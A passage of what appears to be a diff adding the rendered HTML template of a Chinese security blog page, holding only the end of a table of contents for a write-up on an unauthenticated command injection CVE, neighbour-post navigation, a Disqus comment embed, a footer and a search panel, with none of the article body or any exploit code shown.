class="toc-text">CVE-2026-34910：未认证命令注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E8%B7%AF"><span class="toc-text">攻击链路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol>
+                    <a class="toc-panel__top" href="#article-header">↑ RETURN_TO_HEADER</a>
+                </div>
+            </aside>
+        
+    </div>
+
+    
+        <nav class="article-neighbors" aria-label="Adjacent posts">
+            
+                <span class="article-neighbors__empty">← PREVIOUS_LOG // NULL</span>
+            
+
+            
+                <a href="/research/CVE-2020-25279/" rel="next">
+                    <span>NEXT_LOG →</span>
+                    <strong>CVE-2020-25279 分析复现</strong>
+                </a>
+            
+        </nav>
+    
+
+    
+        <div class="article-comments">
+            
+
+
+<section class="comments-section comments-section--no-recommendations" aria-labelledby="comments-title">
+    <p class="section-kicker">// EXTERNAL_CHANNEL</p>
+    <h2 id="comments-title">COMMENTS</h2>
+    <div id="disqus_thread"></div>
+    <script>
+        (function () {
+            if (/^(?:localhost|127\.0\.0\.1|\[::1\])$/.test(window.location.hostname)) {
+                document.getElementById('disqus_thread').textContent = 'LOCAL_PREVIEW // COMMENTS_NOT_LOADED';
+                return;
+            }
+            var d = document, s = d.createElement('script');
+            s.src = 'https://' + "starlight-blog" + '.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', String(+new Date()));
+            (d.head || d.body).appendChild(s);
+        }());
+    </script>
+    <noscript>Please enable JavaScript to view comments.</noscript>
+</section>
+
+
+        </div>
+    
+</article>
+
+</section>
+
+        </div>
+    </main>
+
+    <!-- Footer -->
+    
+<footer class="site-footer">
+    <section class="footer-signal" aria-labelledby="footer-signal-title">
+        <div class="footer-signal__copy">
+            <p class="terminal-command"><span class="prompt">$</span> contact --channel secure</p>
+            <h2 id="footer-signal-title">Starlight's blog — 危栈望星空</h2>
+            <p>// RESPONSE_TIME: WHEN_THE_SIGNAL_IS_CLEAR</p>
+        </div>
+        
+            <a class="footer-email" href="https://github.com/XxingGoD" target="_blank" rel="noopener noreferrer">
+                <span>GITHUB / XXINGGOD</span><span aria-hidden="true">↗</span>
+            </a>
+        
+    </section>
+
+    <div class="footer-meta">
+        <p>© 2026 Starlight · BUILT_WITH_HEXO · SIGNAL_THEME</p>
+        <div class="footer-links">
+            <a href="https://github.com/XxingGoD" target="_blank" rel="noopener noreferrer">GITHUB</a>
+            
+            
+            
+        </div>
+        <a class="back-to-top" href="#top" aria-label="回到顶部">↑ TOP</a>
+    </div>
+</footer>
+
+</div>
+
+<!-- Local post search -->
+
+
+
+<section id="search-panel" class="search-panel" data-search-panel data-search-index-url="/search.json" hidden aria-hidden="true">
+    <button class="search-panel__backdrop" type="button" data-search-close tabindex="-1" aria-label="Close search"></button>
+    <div class="search-terminal" role="dialog" aria-modal="true" aria-labelledby="search-dialog-title">
+        <header class="search-terminal__bar">
+            <div class="window-lights" aria-hidden="true"><span></span><span></span><span></span></div>
+            <p id="search-dialog-title">SEARCH_PROTOCOL // LOCAL_INDEX</p>
+            <button type="button" data-search-close aria-label="Close search">[ESC]</button>
+        </header>
+        <div class="search-terminal__body">
+            <label class="search-label" for="search-input"><span class="prompt">$</span> query --all-posts</label>
+            <div class="search-input-row">
+                <span aria-hidden="true">&gt;</span>
+                <input id="search-input" data-search-input type="search" inputmode="search" autocomplete="off" spellcheck="false" placeholder="输入标题、标签或关键词…" aria-describedby="search-status">
+                <span class="search-caret" aria-hidden="true"></span>
+            </div>
+            <p id="search-status" class="search-status" data-search-status aria-live="polite">TYPE_TO_SCAN_THE_ARCHIVE</p>
+            <div id="search-results" class="search-results" data-search-results></div>
+        </div>
+    </div>
+</section>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery (local) -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Gallery (local) -->
+<script src="/js/featherlight.min.js"></script>
+
+<!-- Custom JavaScript -->
+
+<script src="/js/main.js"></script>
+
+
+
+</body>
+
+</html>
